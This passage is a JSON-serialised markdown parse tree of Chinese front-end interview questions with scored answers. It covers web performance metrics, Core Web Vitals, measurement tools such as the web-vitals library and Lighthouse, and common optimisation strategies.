Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","text":" FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。\\n","task":false,"loose":false,"text":"**1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","tokens":[{"type":"text","raw":"**1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","text":"**1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","text":" SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。\\n","task":false,"loose":false,"text":"**1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","tokens":[{"type":"text","raw":"**1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","text":"**1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","text":" CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。\\n","task":false,"loose":false,"text":"**1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","tokens":[{"type":"text","raw":"**1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","text":"**1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","text":" INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。\\n","task":false,"loose":false,"text":"**1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","tokens":[{"type":"text","raw":"**1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","text":"**1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","text":" FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","task":false,"loose":false,"text":"**1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","tokens":[{"type":"text","raw":"**1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","text":"**1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","text":" TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Core Web Vitals指的是什么？\\n\\n","depth":2,"text":"Core Web Vitals指的是什么？","tokens":[{"type":"text","raw":"Core Web Vitals指的是什么？","text":"Core Web Vitals指的是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","task":false,"loose":false,"text":"**1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","tokens":[{"type":"text","raw":"**1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","text":"**1：** Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","text":" Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >Core Web Vitals 包含了三个指标：INP、LCP、CLS","tokens":[{"type":"paragraph","raw":"Core Web Vitals 包含了三个指标：INP、LCP、CLS","text":"Core Web Vitals 包含了三个指标：INP、LCP、CLS","tokens":[{"type":"text","raw":"Core Web Vitals 包含了三个指标：INP、LCP、CLS","text":"Core Web Vitals 包含了三个指标：INP、LCP、CLS","escaped":false}]}],"text":"Core Web Vitals 包含了三个指标：INP、LCP、CLS"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 性能测量工具有哪些？\\n\\n","depth":2,"text":"性能测量工具有哪些？","tokens":[{"type":"text","raw":"性能测量工具有哪些？","text":"性能测量工具有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","task":false,"loose":false,"text":"**2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","tokens":[{"type":"text","raw":"**2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","text":"**2：** 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","text":" 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nimport {onCLS, onINP, onLCP, onFCP, onFID, onTTFB} from \'web-vitals\';\\n\\nonCLS(console.log);\\nonINP(console.log);\\nonLCP(console.log);\\nonFCP(console.log);\\nonFID(console.log);\\nonTTFB(console.log);\\n```","lang":"javascript","text":"import {onCLS, onINP, onLCP, onFCP, onFID, onTTFB} from \'web-vitals\';\\n\\nonCLS(console.log);\\nonINP(console.log);\\nonLCP(console.log);\\nonFCP(console.log);\\nonFID(console.log);\\nonTTFB(console.log);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n![alt text](/public/images/PSI.png)\\n\\n- **2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n![alt text](/public/images/Lighthouse.png)","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n![alt text](/public/images/PSI.png)\\n\\n","task":false,"loose":true,"text":"**2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n![alt text](/public/images/PSI.png)\\n","tokens":[{"type":"text","raw":"**2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n\\n![alt text](/public/images/PSI.png)\\n","text":"**2：** 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：  \\n![alt text](/public/images/PSI.png)","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：","text":" 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：","escaped":false},{"type":"br","raw":"  \\n"},{"type":"image","raw":"![alt text](/public/images/PSI.png)","href":"/public/images/PSI.png","title":null,"text":"alt text"}]}]},{"type":"list_item","raw":"- **2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n![alt text](/public/images/Lighthouse.png)","task":false,"loose":true,"text":"**2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n![alt text](/public/images/Lighthouse.png)","tokens":[{"type":"text","raw":"**2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n\\n![alt text](/public/images/Lighthouse.png)","text":"**2：** 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n![alt text](/public/images/Lighthouse.png)","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n","text":" 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n","escaped":false},{"type":"image","raw":"![alt text](/public/images/Lighthouse.png)","href":"/public/images/Lighthouse.png","title":null,"text":"alt text"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何优化前端性能？列举一些常见的性能优化策略\\n\\n","depth":2,"text":"如何优化前端性能？列举一些常见的性能优化策略","tokens":[{"type":"text","raw":"如何优化前端性能？列举一些常见的性能优化策略","text":"如何优化前端性能？列举一些常见的性能优化策略","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（10 分）\\n\\n","depth":4,"text":"解答（10 分）","tokens":[{"type":"text","raw":"解答（10 分）","text":"解答（10 分）","escaped":false}]},{"type":"list","raw":"- **1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。\\n- **1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。\\n- **1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。\\n- **1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。\\n- **1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。\\n- **1：** 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。\\n- **1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。\\n- **1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。\\n- **1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。\\n- **1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。\\n","task":false,"loose":false,"text":"**1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","tokens":[{"type":"text","raw":"**1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","text":"**1：** 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","text":" 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。\\n","task":false,"loose":false,"text":"**1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","tokens":[{"type":"text","raw":"**1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","text":"**1：**  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","text":"  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。\\n","task":false,"loose":false,"text":"**1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","tokens":[{"type":"text","raw":"**1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","text":"**1：** 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","text":" 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。\\n","task":false,"loose":false,"text":"**1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","tokens":[{"type":"text","raw":"**1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","text":"**1：** 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","text":" 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。\\n","task":false,"loose":false,"text":"**1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","tokens":[{"type":"text","raw":"**1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","text":"**1：** 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","text":" 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。\\n","task":false,"loose":false,"text":"**1：** 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","tokens":[{"type":"text","raw":"**1：** 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","text":"**1：** 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","text":" 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。\\n","task":false,"loose":false,"text":"**1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","tokens":[{"type":"text","raw":"**1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","text":"**1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","text":" 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。\\n","task":false,"loose":false,"text":"**1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","tokens":[{"type":"text","raw":"**1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","text":"**1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","text":" 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。\\n","task":false,"loose":false,"text":"**1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","tokens":[{"type":"text","raw":"**1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","text":"**1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 